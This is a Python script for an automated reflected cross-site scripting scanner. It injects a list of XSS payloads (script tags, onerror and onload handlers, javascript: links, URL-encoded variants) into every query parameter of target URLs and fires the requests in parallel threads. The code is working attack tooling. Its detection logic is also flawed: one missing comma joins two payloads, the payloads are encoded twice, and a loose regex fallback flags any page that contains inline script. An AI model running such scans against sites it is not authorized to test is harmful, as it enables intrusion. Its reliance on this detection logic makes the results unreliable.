import requests
from urllib.parse import urlparse, parse_qs, urlencode, quote_plus, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import re

# Set up logging for better debugging and information output
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger()

# XSS payloads to test
payloads = [
    "<script>alert('xssxss')</script>",
    "%0A%0A%3Cscript%3Ealert('xssxss')%3C/script%3E"
    "<img src='x' onerror='alert(xssxss)'>",
    "<svg/onload=alert(xssxss)>",
    "<body onload=alert(xssxss)>",
    "<iframe src='javascript:alert(xssxss)'></iframe>",
    "<div onmouseover='alert(xssxss)'>Hover me</div>",
    "<a href='javascript:alert(xssxss)'>Click me</a>",
    "%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(xssxss)%3E",
    "%3Cimg+src%3Dcopyparty+onerror%3Dalert(xssxss)%3E"
]

def inject_payload(url, param, payload):
    """Injects XSS payload into the URL parameter and checks for vulnerabilities."""
    try:
        # Decode the URL and its parameters to handle encoding issues
        parsed_url = urlparse(url)
        query = parse_qs(parsed_url.query)

        # URL encode the payload correctly
        query[param] = quote_plus(payload)

        new_query = urlencode(query, doseq=True)
        vulnerable_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"

        logger.info(f"[*] Testing payload on: {vulnerable_url}")

        # Send request to the server with the payload in the query string
        response = requests.get(vulnerable_url, timeout=10)

        # Check for XSS by searching for the payload in the HTML content or JS context
        if payload in response.text:
            logger.info(f"[!] XSS vulnerability detected at: {vulnerable_url}")
            return vulnerable_url
        elif payload in unquote(response.text):  # Check if URL-decoded content matches the payload
            logger.info(f"[!] XSS vulnerability detected (decoded): {vulnerable_url}")
            return vulnerable_url
        else:
            # Check for signs of XSS via event handlers or inline JavaScript
            if re.search(r'on\w+=".*?"|<script.*?>.*?</script>|<img[^>]+onerror=["\'].*?["\']>', response.text):
                logger.info(f"[!] XSS vulnerability detected (event handler or inline JS): {vulnerable_url}")
                return vulnerable_url
            logger.debug(f"[.] No XSS detected in {vulnerable_url}")

    except requests.exceptions.RequestException as e:
        logger.warning(f"[!] Error with URL {url}: {e}")
    return None

def detect_xss_vulnerabilities(urls, payloads):
    """Detect XSS vulnerabilities in a list of URLs."""
    vulnerable_urls = []
    tasks = []

    for url in urls:
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        for param in params:
            # Loop through all parameters and test with all payloads
            for payload in payloads:
                tasks.append((url, param, payload))

    # Use ThreadPoolExecutor to speed up the process
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(inject_payload, *task) for task in tasks]
        for future in as_completed(futures):
            result = future.result()
            if result:
                vulnerable_urls.append(result)

    return vulnerable_urls


